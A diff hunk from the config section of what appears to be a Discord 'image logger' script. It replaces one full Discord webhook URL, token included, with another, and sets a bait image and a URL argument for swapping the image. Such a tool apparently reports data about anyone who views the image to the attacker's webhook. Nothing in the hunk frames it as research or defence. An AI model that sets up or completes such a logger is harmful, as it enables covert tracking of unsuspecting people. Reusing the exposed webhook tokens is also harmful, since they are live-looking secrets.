@@ -12,7 +12,7 @@ __author__ = "XSYTHO"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1369282563784441856/h3tUAuOYn4x-WES3kCas5x5I8nw2KNhUsERenma0W22zckPVbsqbtu6Ozjy49J24ZUQz",
+    "webhook": "https://discord.com/api/webhooks/1404664414853927035/Ua8FOHI_FldyOVD28XQYaMJAh-Cb_8Lqnp0x9sI4gJ1_FBkJQ1HwMg699_V4rlPfFkmN",
     "image": "https://cdn.discordapp.com/attachments/1371780492755468349/1372767823360819283/bobokatol.png?ex=685817e9&is=6856c669&hm=5559771391c3f924afb4dad89bbbbde508d31f166cd7054ec4f1f094d3358b6e&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
